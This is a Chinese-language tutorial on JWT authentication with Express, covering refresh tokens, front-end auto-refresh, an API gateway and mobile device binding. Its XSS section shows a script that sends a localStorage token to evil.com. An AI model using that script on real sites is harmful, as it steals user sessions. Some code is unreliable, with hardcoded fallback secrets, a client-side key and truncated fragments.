## 📖 知识点概述

### 核心概念

**JWT（JSON Web Token）**是一种开放标准（RFC 7519），用于在网络应用间安全地传输信息。JWT由三部分组成：Header（头部）、Payload（负载）、Signature（签名），通过`.`连接。

### JWT结构

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiIxMjMiLCJpYXQiOjE2NDAwMDAwMDB9.signature
│─────────── Header ──────────│─────────── Payload ──────────│─ Signature ─│
```

**三部分详解：**
```javascript
// Header（头部）- Base64编码
{
  "alg": "HS256",  // 签名算法
  "typ": "JWT"     // Token类型
}

// Payload（负载）- Base64编码
{
  "userId": "123",
  "username": "john",
  "iat": 1640000000,  // 签发时间
  "exp": 1640003600   // 过期时间
}

// Signature（签名）- HMAC SHA256
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret
)
```

### 解决的问题

- **无状态扩展**：服务器不需要存储会话
- **跨域认证**：不受同源策略限制
- **微服务友好**：Token可在服务间传递
- **移动端适配**：原生APP无Cookie机制

### JWT vs Session

| 维度 | JWT | Session |
|------|-----|---------|
| **存储** | 客户端 | 服务器端 |
| **状态** | 无状态 | 有状态 |
| **扩展性** | 易扩展 | 需共享Session |
| **即时撤销** | 困难 | 容易 |
| **数据大小** | 受限（URL长度） | 不受限 |
| **性能** | 验证签名（快） | 查询存储（慢） |

### 典型应用场景

- **前后端分离**：SPA应用认证
- **移动端API**：iOS/Android App
- **微服务**：服务间认证
- **单点登录**：跨域SSO

#### 第一步：基础JWT实现

```javascript
// jwt-basic.js
import jwt from 'jsonwebtoken';
import express from 'express';
import bcrypt from 'bcrypt';

const app = express();
app.use(express.json());

// 💡 JWT配置
const JWT_SECRET = process.env.JWT_SECRET || 'your-secret-key-min-32-chars';
const JWT_EXPIRES_IN = '1h'; // 1小时

// 模拟数据库
const users = [
  {
    id: 1,
    username: 'john',
    email: 'john@example.com',
    // bcrypt hash of 'password123'
    password: '$2b$10$CwTycUXWue0Thq9StjUM0uJ8qDXx5w5mJZNKJzH.JW.Fj/bXJ5Lx6'
  }
];

// 💡 生成Access Token
function generateAccessToken(user) {
  return jwt.sign(
    {
      // 💡 Payload（载荷）
      userId: user.id,
      username: user.username,
      email: user.email,
      role: user.role || 'user'
    },
    JWT_SECRET,
    {
      // 💡 Options（选项）
      expiresIn: JWT_EXPIRES_IN,      // 过期时间
      issuer: 'my-app',                 // 签发者
      audience: 'my-app-users',         // 接收者
      subject: user.id.toString(),      // 主题（通常是用户ID）
      jwtid: crypto.randomUUID()        // JWT ID（唯一标识）
    }
  );
}

// 💡 登录接口
app.post('/api/auth/login', async (req, res) => {
  try {
    const { email, password } = req.body;
    
    // 1. 验证输入
    if (!email || !password) {
      return res.status(400).json({
        success: false,
        error: '缺少必填字段'
      });
    }
    
    // 2. 查询用户
    const user = users.find(u => u.email === email);
    if (!user) {
      return res.status(401).json({
        success: false,
        error: '邮箱或密码错误'
      });
    }
    
    // 3. 验证密码
    const validPassword = await bcrypt.compare(password, user.password);
    if (!validPassword) {
      return res.status(401).json({
        success: false,
        error: '邮箱或密码错误'
      });
    }
    
    // 4. 💡 生成JWT
    const accessToken = generateAccessToken(user);
    
    // 5. 返回Token
    res.json({
      success: true,
      message: '登录成功',
      accessToken,
      tokenType: 'Bearer',
      expiresIn: 3600, // 秒
      user: {
        id: user.id,
        username: user.username,
        email: user.email
      }
    });
  } catch (error) {
    console.error('登录失败:', error);
    res.status(500).json({
      success: false,
      error: '服务器错误'
    });
  }
});

// 💡 验证Token中间件
function authenticateToken(req, res, next) {
  // 1. 从请求头获取Token
  const authHeader = req.headers['authorization'];
  const token = authHeader && authHeader.split(' ')[1]; // "Bearer TOKEN"
  
  if (!token) {
    return res.status(401).json({
      success: false,
      error: '缺少认证Token',
      code: 'TOKEN_MISSING'
    });
  }
  
  try {
    // 2. 💡 验证Token
    const decoded = jwt.verify(token, JWT_SECRET, {
      issuer: 'my-app',
      audience: 'my-app-users'
    });
    
    // 3. 将解码后的信息附加到请求对象
    req.user = {
      userId: decoded.userId,
      username: decoded.username,
      email: decoded.email,
      role: decoded.role
    };
    
    next();
  } catch (error) {
    // 4. 错误处理
    if (error.name === 'TokenExpiredError') {
      return res.status(401).json({
        success: false,
        error: 'Token已过期',
        code: 'TOKEN_EXPIRED',
        expiredAt: error.expiredAt
      });
    }
    
    if (error.name === 'JsonWebTokenError') {
      return res.status(401).json({
        success: false,
        error: '无效的Token',
        code: 'TOKEN_INVALID'
      });
    }
    
    if (error.name === 'NotBeforeError') {
      return res.status(401).json({
        success: false,
        error: 'Token尚未生效',
        code: 'TOKEN_NOT_ACTIVE'
      });
    }
    
    res.status(500).json({
      success: false,
      error: '验证失败'
    });
  }
}

// 💡 受保护的路由
app.get('/api/auth/me', authenticateToken, (req, res) => {
  res.json({
    success: true,
    user: req.user
  });
});

app.listen(3000);
```

#### 第二步：Refresh Token机制

```javascript
// jwt-refresh-token.js
import jwt from 'jsonwebtoken';
import crypto from 'crypto';

const JWT_SECRET = process.env.JWT_SECRET;
const JWT_REFRESH_SECRET = process.env.JWT_REFRESH_SECRET || 'refresh-secret-key';
const ACCESS_TOKEN_EXPIRES = '15m'; // 15分钟
const REFRESH_TOKEN_EXPIRES = '7d'; // 7天

// 💡 存储Refresh Token（实际应用使用Redis）
const refreshTokenStore = new Map();

// 💡 生成Token对
function generateTokenPair(user) {
  // Access Token（短期）
  const accessToken = jwt.sign(
    {
      userId: user.id,
      username: user.username,
      type: 'access'
    },
    JWT_SECRET,
    { expiresIn: ACCESS_TOKEN_EXPIRES }
  );
  
  // Refresh Token（长期）
  const refreshToken = jwt.sign(
    {
      userId: user.id,
      tokenId: crypto.randomUUID(), // 唯一ID
      type: 'refresh'
    },
    JWT_REFRESH_SECRET,
    { expiresIn: REFRESH_TOKEN_EXPIRES }
  );
  
  // 存储Refresh Token
  const decoded = jwt.decode(refreshToken);
  refreshTokenStore.set(decoded.tokenId, {
    userId: user.id,
    refreshToken,
    createdAt: Date.now(),
    expiresAt: decoded.exp * 1000
  });
  
  return { accessToken, refreshToken };
}

// 💡 登录接口
app.post('/api/auth/login', async (req, res) => {
  // ... 验证用户 ...
  
  const { accessToken, refreshToken } = generateTokenPair(user);
  
  res.json({
    success: true,
    accessToken,
    refreshToken,
    expiresIn: 900 // 15分钟（秒）
  });
});

// 💡 刷新Token接口
app.post('/api/auth/refresh', async (req, res) => {
  try {
    const { refreshToken } = req.body;
    
    if (!refreshToken) {
      return res.status(400).json({
        success: false,
        error: '缺少刷新Token'
      });
    }
    
    // 1. 验证Refresh Token
    const decoded = jwt.verify(refreshToken, JWT_REFRESH_SECRET);
    
    if (decoded.type !== 'refresh') {
      return res.status(401).json({
        success: false,
        error: 'Token类型错误'
      });
    }
    
    // 2. 检查Token是否存在于存储中
    const storedToken = refreshTokenStore.get(decoded.tokenId);
    if (!storedToken || storedToken.refreshToken !== refreshToken) {
      return res.status(401).json({
        success: false,
        error: '无效的刷新Token',
        code: 'REFRESH_TOKEN_INVALID'
      });
    }
    
    // 3. 查询用户
    const user = users.find(u => u.id === decoded.userId);
    if (!user) {
      return res.status(404).json({
        success: false,
        error: '用户不存在'
      });
    }
    
    // 4. 💡 生成新的Access Token
    const newAccessToken = jwt.sign(
      {
        userId: user.id,
        username: user.username,
        type: 'access'
      },
      JWT_SECRET,
      { expiresIn: ACCESS_TOKEN_EXPIRES }
    );
    
    res.json({
      success: true,
      accessToken: newAccessToken,
      expiresIn: 900
    });
  } catch (error) {
    if (error.name === 'TokenExpiredError') {
      return res.status(401).json({
        success: false,
        error: '刷新Token已过期，请重新登录',
        code: 'REFRESH_TOKEN_EXPIRED'
      });
    }
    
    res.status(401).json({
      success: false,
      error: '刷新Token无效'
    });
  }
});

// 💡 登出接口
app.post('/api/auth/logout', authenticateToken, async (req, res) => {
  const { refreshToken } = req.body;
  
  if (refreshToken) {
    try {
      const decoded = jwt.decode(refreshToken);
      if (decoded && decoded.tokenId) {
        // 删除Refresh Token
        refreshTokenStore.delete(decoded.tokenId);
      }
    } catch (error) {
      console.error('删除刷新Token失败:', error);
    }
  }
  
  res.json({
    success: true,
    message: '登出成功'
  });
});

// 💡 撤销所有Token（强制登出所有设备）
app.post('/api/auth/logout-all', authenticateToken, (req, res) => {
  const userId = req.user.userId;
  
  // 删除该用户的所有Refresh Token
  for (const [tokenId, data] of refreshTokenStore.entries()) {
    if (data.userId === userId) {
      refreshTokenStore.delete(tokenId);
    }
  }
  
  res.json({
    success: true,
    message: '已登出所有设备'
  });
});
```

#### 第三步：前端自动刷新Token

```javascript
// frontend-auto-refresh.js

// 💡 Token管理器
class TokenManager {
  constructor() {
    this.accessToken = null;
    this.refreshToken = null;
    this.refreshPromise = null;
  }
  
  // 设置Token
  setTokens(accessToken, refreshToken) {
    this.accessToken = accessToken;
    this.refreshToken = refreshToken;
    
    // 存储到localStorage
    localStorage.setItem('accessToken', accessToken);
    localStorage.setItem('refreshToken', refreshToken);
    
    // 💡 解析Token获取过期时间
    const decoded = this.decodeToken(accessToken);
    if (decoded && decoded.exp) {
      // 在Token过期前2分钟自动刷新
      const expiresIn = decoded.exp * 1000 - Date.now();
      const refreshTime = expiresIn - 2 * 60 * 1000;
      
      if (refreshTime > 0) {
        setTimeout(() => this.refreshAccessToken(), refreshTime);
      }
    }
  }
  
  // 获取Access Token
  getAccessToken() {
    return this.accessToken || localStorage.getItem('accessToken');
  }
  
  // 获取Refresh Token
  getRefreshToken() {
    return this.refreshToken || localStorage.getItem('refreshToken');
  }
  
  // 解码Token（不验证签名）
  decodeToken(token) {
    try {
      const base64Url = token.split('.')[1];
      const base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');
      const jsonPayload = decodeURIComponent(
        atob(base64).split('').map(c => {
          return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
        }).join('')
      );
      return JSON.parse(jsonPayload);
    } catch (error) {
      return null;
    }
  }
  
  // 💡 刷新Access Token
  async refreshAccessToken() {
    // 防止并发刷新
    if (this.refreshPromise) {
      return this.refreshPromise;
    }
    
    this.refreshPromise = (async () => {
      try {
        const refreshToken = this.getRefreshToken();
        
        if (!refreshToken) {
          throw new Error('No refresh token');
        }
        
        const response = await fetch('/api/auth/refresh', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ refreshToken })
        });
        
        if (!response.ok) {
          throw new Error('Refresh failed');
        }
        
        const data = await response.json();
        
        // 更新Access Token
        this.setTokens(data.accessToken, refreshToken);
        
        return data.accessToken;
      } catch (error) {
        // 刷新失败，清除Token并跳转登录
        this.clearTokens();
        window.location.href = '/login';
        throw error;
      } finally {
        this.refreshPromise = null;
      }
    })();
    
    return this.refreshPromise;
  }
  
  // 清除Token
  clearTokens() {
    this.accessToken = null;
    this.refreshToken = null;
    localStorage.removeItem('accessToken');
    localStorage.removeItem('refreshToken');
  }
}

const tokenManager = new TokenManager();

// 💡 Fetch拦截器
const originalFetch = window.fetch;
window.fetch = async function(...args) {
  const [url, options = {}] = args;
  
  // 添加Authorization头
  const token = tokenManager.getAccessToken();
  if (token) {
    options.headers = {
      ...options.headers,
      'Authorization': `Bearer ${token}`
    };
  }
  
  // 发送请求
  let response = await originalFetch(url, options);
  
  // 💡 如果Token过期，自动刷新并重试
  if (response.status === 401) {
    const errorData = await response.json();
    
    if (errorData.code === 'TOKEN_EXPIRED') {
      try {
        // 刷新Token
        const newToken = await tokenManager.refreshAccessToken();
        
        // 使用新Token重试请求
        options.headers['Authorization'] = `Bearer ${newToken}`;
        response = await originalFetch(url, options);
      } catch (error) {
        // 刷新失败，跳转登录
        window.location.href = '/login';
      }
    }
  }
  
  return response;
};

// 💡 Axios拦截器（推荐）
import axios from 'axios';

// 请求拦截器
axios.interceptors.request.use(
  config => {
    const token = tokenManager.getAccessToken();
    if (token) {
      config.headers.Authorization = `Bearer ${token}`;
    }
    return config;
  },
  error => Promise.reject(error)
);

// 响应拦截器
axios.interceptors.response.use(
  response => response,
  async error => {
    const originalRequest = error.config;
    
    // 💡 Token过期，自动刷新
    if (error.response?.status === 401 && 
        error.response?.data?.code === 'TOKEN_EXPIRED' &&
        !originalRequest._retry) {
      
      originalRequest._retry = true;
      
      try {
        const newToken = await tokenManager.refreshAccessToken();
        originalRequest.headers.Authorization = `Bearer ${newToken}`;
        return axios(originalRequest);
      } catch (refreshError) {
        window.location.href = '/login';
        return Promise.reject(refreshError);
      }
    }
    
    return Promise.reject(error);
  }
);
```

## 🔧 错误处理

### 高频错误1：Token过期

**现象：**
```json
{
  "success": false,
  "error": "Token已过期",
  "code": "TOKEN_EXPIRED"
}
```

**原因：**
Token的`exp`（过期时间）已超过当前时间

**解决方案：**

```javascript
// ✅ 方案1：使用Refresh Token刷新
async function handleTokenExpired() {
  try {
    const refreshToken = localStorage.getItem('refreshToken');
    
    const response = await fetch('/api/auth/refresh', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ refreshToken })
    });
    
    if (response.ok) {
      const { accessToken } = await response.json();
      localStorage.setItem('accessToken', accessToken);
      
      // 重试原请求
      return retryOriginalRequest();
    }
  } catch (error) {
    // 刷新失败，跳转登录
    window.location.href = '/login';
  }
}

// ✅ 方案2：提前刷新（推荐）
function scheduleTokenRefresh(token) {
  const decoded = parseJwt(token);
  const expiresIn = decoded.exp * 1000 - Date.now();
  
  // 💡 在过期前5分钟刷新
  const refreshTime = expiresIn - 5 * 60 * 1000;
  
  if (refreshTime > 0) {
    setTimeout(async () => {
      await refreshAccessToken();
    }, refreshTime);
  }
}

// ✅ 方案3：检查Token是否即将过期
function isTokenExpiringSoon(token, thresholdMinutes = 5) {
  try {
    const decoded = parseJwt(token);
    const expiresAt = decoded.exp * 1000;
    const now = Date.now();
    const threshold = thresholdMinutes * 60 * 1000;
    
    return (expiresAt - now) < threshold;
  } catch {
    return true;
  }
}

// 使用
if (isTokenExpiringSoon(accessToken)) {
  await refreshAccessToken();
}
```

### 高频错误2：签名验证失败

**现象：**
```json
{
  "success": false,
  "error": "无效的Token",
  "code": "TOKEN_INVALID"
}
```

**原因：**
1. Token被篡改
2. 签名密钥不匹配
3. Token格式错误

**解决方案：**

```javascript
// ✅ 检查1：确保密钥一致
// 服务器端
const JWT_SECRET = process.env.JWT_SECRET;

// 签发Token
const token = jwt.sign(payload, JWT_SECRET);

// 验证Token（密钥必须相同）
jwt.verify(token, JWT_SECRET);

// ✅ 检查2：验证Token格式
function isValidJwtFormat(token) {
  // JWT应该由3部分组成，用.分隔
  const parts = token.split('.');
  
  if (parts.length !== 3) {
    return false;
  }
  
  // 每部分都应该是有效的Base64
  try {
    parts.forEach(part => {
      atob(part.replace(/-/g, '+').replace(/_/g, '/'));
    });
    return true;
  } catch {
    return false;
  }
}

// ✅ 检查3：Token完整性
app.use((req, res, next) => {
  const authHeader = req.headers.authorization;
  
  if (authHeader) {
    const token = authHeader.split(' ')[1];
    
    // 检查格式
    if (!isValidJwtFormat(token)) {
      return res.status(401).json({
        success: false,
        error: 'Token格式错误'
      });
    }
  }
  
  next();
});

// ✅ 检查4：处理不同签名算法
jwt.verify(token, JWT_SECRET, {
  algorithms: ['HS256'] // ⚠️ 明确指定算法，防止算法混淆攻击
});
```

### 高频错误3：Token被XSS窃取

**现象：**
用户Token被恶意脚本窃取，账户被盗用

**攻击示例：**
```html
<!-- 恶意脚本注入 -->
<script>
  const token = localStorage.getItem('accessToken');
  fetch('http://evil.com/steal?token=' + token);
</script>
```

**解决方案：**

```javascript
// ❌ 危险：Token存储在localStorage
localStorage.setItem('accessToken', token);

// ✅ 方案1：Token存储在HttpOnly Cookie（最安全）
app.post('/api/auth/login', async (req, res) => {
  const { accessToken, refreshToken } = generateTokenPair(user);
  
  // 💡 Access Token存HttpOnly Cookie
  res.cookie('accessToken', accessToken, {
    httpOnly: true,    // JavaScript无法访问
    secure: true,       // 只在HTTPS传输
    sameSite: 'strict', // 防CSRF
    maxAge: 900000      // 15分钟
  });
  
  // 💡 Refresh Token也存HttpOnly Cookie
  res.cookie('refreshToken', refreshToken, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    maxAge: 7 * 24 * 3600000 // 7天
  });
  
  res.json({
    success: true,
    message: '登录成功'
  });
});

// 后端从Cookie读取Token
function authenticateFromCookie(req, res, next) {
  const token = req.cookies.accessToken;
  
  if (!token) {
    return res.status(401).json({ error: '需要登录' });
  }
  
  try {
    const decoded = jwt.verify(token, JWT_SECRET);
    req.user = decoded;
    next();
  } catch (error) {
    res.status(401).json({ error: 'Token无效' });
  }
}

// ✅ 方案2：实施CSP（内容安全策略）
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; " +
    "script-src 'self' 'unsafe-inline' https://trusted-cdn.com; " +
    "style-src 'self' 'unsafe-inline';"
  );
  next();
});

  constructor() {
    this.token = null;
  }
  
  setToken(token) {
    this.token = token;
  }
  
  getToken() {
    return this.token;
  }
  
  clearToken() {
    this.token = null;
  }
}

const tokenStore = new TokenStore();

// ✅ 方案4：Token加密存储
import CryptoJS from 'crypto-js';

const ENCRYPTION_KEY = 'user-specific-key'; // 应该是用户特定的

function encryptToken(token) {
  return CryptoJS.AES.encrypt(token, ENCRYPTION_KEY).toString();
}

function decryptToken(encryptedToken) {
  const bytes = CryptoJS.AES.decrypt(encryptedToken, ENCRYPTION_KEY);
  return bytes.toString(CryptoJS.enc.Utf8);
}

// 存储加密后的Token
localStorage.setItem('token', encryptToken(accessToken));

// 使用时解密
const token = decryptToken(localStorage.getItem('token'));
```

### 场景1：微服务架构API网关

**问题背景：**
某电商平台采用微服务架构，有10+个独立服务（用户、商品、订单、支付等），需要统一的认证方案，要求：
- 单点登录（一次登录访问所有服务）
- 服务间调用无需重复认证
- 支持100万+QPS
- 横向扩展方便

**技术选型理由：**
1. **JWT无状态**：不需要共享Session存储
2. **易扩展**：增加服务器无需同步状态
3. **跨服务**：Token可在服务间传递
4. **性能高**：只需验证签名，无需查询数据库

**完整实现：**

```javascript
// api-gateway.js（API网关）
import express from 'express';
import jwt from 'jsonwebtoken';
import httpProxy from 'http-proxy';

const app = express();
app.use(express.json());

const proxy = httpProxy.createProxyServer();
const JWT_SECRET = process.env.JWT_SECRET;

// 💡 服务注册表
const services = {
  user: 'http://localhost:3001',
  product: 'http://localhost:3002',
  order: 'http://localhost:3003',
  payment: 'http://localhost:3004'
};

// 💡 公开路由（不需要认证）
const publicRoutes = [
  '/api/auth/login',
  '/api/auth/register',
  '/api/products' // 商品列表公开
];

// 💡 认证中间件
function authenticateGateway(req, res, next) {
  // 检查是否是公开路由
  if (publicRoutes.some(route => req.path.startsWith(route))) {
    return next();
  }
  
  const authHeader = req.headers.authorization;
  const token = authHeader && authHeader.split(' ')[1];
  
  if (!token) {
    return res.status(401).json({
      success: false,
      error: '缺少认证Token'
    });
  }
  
  try {
    // 验证Token
    const decoded = jwt.verify(token, JWT_SECRET);
    
    // 💡 将用户信息添加到请求头（传递给后端服务）
    req.headers['x-user-id'] = decoded.userId;
    req.headers['x-username'] = decoded.username;
    req.headers['x-user-role'] = decoded.role;
    
    // 💡 保留原始Token
    req.headers['x-original-token'] = token;
    
    next();
  } catch (error) {
    if (error.name === 'TokenExpiredError') {
      return res.status(401).json({
        success: false,
        error: 'Token已过期',
        code: 'TOKEN_EXPIRED'
      });
    }
    
    res.status(401).json({
      success: false,
      error: '无效的Token'
    });
  }
}

// 💡 路由分发
app.use('/api/:service/*', authenticateGateway, (req, res) => {
  const serviceName = req.params.service;
  const targetUrl = services[serviceName];
  
  if (!targetUrl) {
    return res.status(404).json({
      success: false,
      error: '服务不存在'
    });
  }
  
  // 代理到目标服务
  proxy.web(req, res, {
    target: targetUrl,
    changeOrigin: true
  }, (error) => {
    console.error('代理错误:', error);
    res.status(502).json({
      success: false,
      error: '服务不可用'
    });
  });
});

// 💡 登录接口（网关处理）
app.post('/api/auth/login', async (req, res) => {
  const { email, password } = req.body;
  
  // 调用用户服务验证
  const userService = services.user;
  const response = await fetch(`${userService}/internal/auth/verify`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email, password })
  });
  
  if (!response.ok) {
    return res.status(401).json({
      success: false,
      error: '登录失败'
    });
  }
  
  const user = await response.json();
  
  // 💡 网关生成JWT
  const accessToken = jwt.sign(
    {
      userId: user.id,
      username: user.username,
      role: user.role,
      permissions: user.permissions || []
    },
    JWT_SECRET,
    { expiresIn: '1h' }
  );
  
  const refreshToken = jwt.sign(
    { userId: user.id, type: 'refresh' },
    JWT_SECRET,
    { expiresIn: '7d' }
  );
  
  res.json({
    success: true,
    accessToken,
    refreshToken,
    user
  });
});

app.listen(3000, () => {
  console.log('API网关运行在 http://localhost:3000');
});

// ========================================

const userApp = express();
```

### 场景2：移动端APP认证系统

**问题背景：**
某社交APP有500万+用户，需要支持iOS和Android，要求：
- 长期登录（30天免登录）
- 离线访问（本地缓存）
- 多设备管理
- 安全性高

**完整实现：**

```javascript
// mobile-auth-server.js
import express from 'express';
import jwt from 'jsonwebtoken';
import crypto from 'crypto';

const app = express();
app.use(express.json());

const JWT_SECRET = process.env.JWT_SECRET;

// 💡 设备Token存储（Redis）
const deviceTokens = new Map();

// 💡 生成设备指纹
function generateDeviceFingerprint(req) {
  const userAgent = req.headers['user-agent'];
  const deviceId = req.headers['x-device-id']; // APP提供
  const platform = req.headers['x-platform']; // ios/android
  
  return crypto
    .createHash('sha256')
    .update(`${deviceId}:${userAgent}:${platform}`)
    .digest('hex');
}

// 💡 登录接口
app.post('/api/auth/login', async (req, res) => {
  const { email, password } = req.body;
  
  // 验证用户
  const user = await db.getUserByEmail(email);
  if (!user || !(await bcrypt.compare(password, user.password))) {
    return res.status(401).json({
      success: false,
      error: '邮箱或密码错误'
    });
  }
  
  // 生成设备指纹
  const deviceFingerprint = generateDeviceFingerprint(req);
  
  // 💡 生成长期Token（30天）
  const accessToken = jwt.sign(
    {
      userId: user.id,
      username: user.username,
      deviceFingerprint, // 绑定设备
      type: 'access'
    },
    JWT_SECRET,
    { expiresIn: '30d' }
  );
  
  // 存储设备Token
  deviceTokens.set(deviceFingerprint, {
    userId: user.id,
    accessToken,
    deviceInfo: {
      deviceId: req.headers['x-device-id'],
      platform: req.headers['x-platform'],
      appVersion: req.headers['x-app-version'],
      loginTime: Date.now(),
      lastActiveTime: Date.now()
    }
  });
  
  res.json({
    success: true,
    accessToken,
    expiresIn: 30 * 24 * 3600,
    user: {
      id: user.id,
      username: user.username,
      avatar: user.avatar
    }
  });
});

// 💡 验证Token（检查设备绑定）
function authenticateMobile(req, res, next) {
  const authHeader = req.headers.authorization;
  const token = authHeader && authHeader.split(' ')[1];
  
  if (!token) {
    return res.status(401).json({
      success: false,
      error: '缺少Token'
    });
  }
  
  try {
    const decoded = jwt.verify(token, JWT_SECRET);
    
    // 💡 验证设备指纹
    const currentFingerprint = generateDeviceFingerprint(req);
    
    if (decoded.deviceFingerprint !== currentFingerprint) {
      return res.status(401).json({
        success: false,
        error: '设备不匹配',
        code: 'DEVICE_MISMATCH'
      });
    }
    
    // 检查Token是否被撤销
    const storedToken = deviceTokens.get(decoded.deviceFingerprint);
    if (!storedToken || storedToken.accessToken !== token) {
      return res.status(401).json({
        success: false,
        error: 'Token已失效',
        code: 'TOKEN_REVOKED'
      });
    }
    
    // 更新最后活跃时间
    storedToken.deviceInfo.lastActiveTime = Date.now();
    
    req.user = {
      userId: decoded.userId,
      username: decoded.username
    };
    
    next();
  } catch (error) {
    if (error.name === 'TokenExpiredError') {
      return res.status(401).json({
        success: false,
        error: 'Token已过期，请重新登录',
        code: 'TOKEN_EXPIRED'
      });
    }
    
    res.status(401).json({
      success: false,
      error: '无效的Token'
    });
  }
}

// 💡 获取当前登录设备列表
app.get('/api/auth/devices', authenticateMobile, (req, res) => {
  const userId = req.user.userId;
  const devices = [];
  
  for (const [fingerprint, data] of deviceTokens.entries()) {
    if (data.userId === userId) {
      devices.push({
        deviceId: data.deviceInfo.deviceId,
        platform: data.deviceInfo.platform,
        loginTime: data.deviceInfo.loginTime,
        lastActiveTime: data.deviceInfo.lastActiveTime,
        isCurrent: fingerprint === generateDeviceFingerprint(req)
      });
    }
  }
  
  res.json({
    success: true,
    devices
  });
});

// 💡 踢出指定设备
app.delete('/api/auth/devices/:deviceId', authenticateMobile, (req, res) => {
  const userId = req.user.userId;
  const targetDeviceId = req.params.deviceId;
  
  for (const [fingerprint, data] of deviceTokens.entries()) {
    if (data.userId === userId && data.deviceInfo.deviceId === targetDeviceId) {
      deviceTokens.delete(fingerprint);
      break;
    }
  }
  
  res.json({
    success: true,
    message: '设备已登出'
  });
});

app.listen(3000);
```

```javascript
import AsyncStorage from '@react-native-async-storage/async-storage';
import DeviceInfo from 'react-native-device-info';

class MobileAuthManager {
  constructor() {
    this.token = null;
  }
  
  // 💡 获取设备信息
  async getDeviceHeaders() {
    const deviceId = await DeviceInfo.getUniqueId();
    const platform = Platform.OS; // ios/android
    const appVersion = DeviceInfo.getVersion();
    
    return {
      'X-Device-Id': deviceId,
      'X-Platform': platform,
      'X-App-Version': appVersion
    };
  }
  
  // 登录
  async login(email, password) {
    const deviceHeaders = await this.getDeviceHeaders();
    
    const response = await fetch('https://api.example.com/api/auth/login', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        ...deviceHeaders
      },
      body: JSON.stringify({ email, password })
    });
    
    if (!response.ok) {
      throw new Error('登录失败');
    }
    
    const data = await response.json();
    
    // 💡 存储Token到安全存储
    await AsyncStorage.setItem('accessToken', data.accessToken);
    this.token = data.accessToken;
    
    return data.user;
  }
  
  // 获取Token
  async getToken() {
    if (!this.token) {
      this.token = await AsyncStorage.getItem('accessToken');
    }
    return this.token;
  }
  
  // 💡 发送认证请求
  async authenticatedRequest(url, options = {}) {
    const token = await this.getToken();
    const deviceHeaders = await this.getDeviceHeaders();
    
    const response = await fetch(url, {
      ...options,
      headers: {
        ...options.headers,
        ...deviceHeaders,
        'Authorization': `Bearer ${token}`
      }
    });
    
    // 处理Token过期
    if (response.status === 401) {
      const errorData = await response.json();
      
      if (errorData.code === 'TOKEN_EXPIRED') {
        // 跳转登录
        await this.logout();
        Navigation.navigate('Login');
      }
    }
    
    return response;
  }
  
  // 登出
  async logout() {
    await AsyncStorage.removeItem('accessToken');
    this.token = null;
  }
}

export default new MobileAuthManager();
```

## 📋 总结

### 核心要点

1. **JWT结构**：Header + Payload + Signature
2. **双Token机制**：短期Access Token + 长期Refresh Token
3. **安全存储**：HttpOnly Cookie > Memory > localStorage
4. **自动刷新**：在Token过期前自动刷新

### 实现关键

1. **密钥管理**：使用环境变量，至少32字符
2. **过期时间**：Access Token 15-60分钟，Refresh Token 7-30天
3. **设备绑定**：移动端绑定设备指纹
4. **签名算法**：使用HS256或RS256

### 应用价值

- **无状态扩展**：支持100万+QPS
- **跨域友好**：适合微服务和移动端
- **安全可控**：通过Refresh Token实现撤销
- **开发效率**：标准化认证流程

### 面试重点

**Q1：JWT的优缺点？**
答：优点：无状态、跨域友好、易扩展。缺点：无法即时撤销、Payload大小受限、需要妥善管理密钥。

**Q2：如何撤销JWT？**
答：维护黑名单（Redis）、使用短期Token+Refresh Token机制、修改用户密钥版本号。

**Q3：JWT存储在哪里最安全？**
答：HttpOnly Cookie最安全（防XSS），其次是内存，localStorage最不安全。

**Q4：Access Token和Refresh Token的区别？**
答：Access Token短期（15分钟），用于API访问；Refresh Token长期（7天），只用于刷新Access Token，提高安全性。

### 注意事项

⚠️ **不要在Payload存储敏感信息**：Payload可被解码
⚠️ **密钥长度至少32字符**：防止暴力破解
⚠️ **明确指定签名算法**：防止算法混淆攻击
⚠️ **实施HTTPS**：防止Token被中间人窃取

### 进阶思考（非必需）

- 如何实现JWT黑名单（高性能）？
- 如何处理分布式系统中的时钟偏移？
- RS256（非对称加密）vs HS256（对称加密）如何选择？
- 如何实现Token无感刷新（用户无感知）？
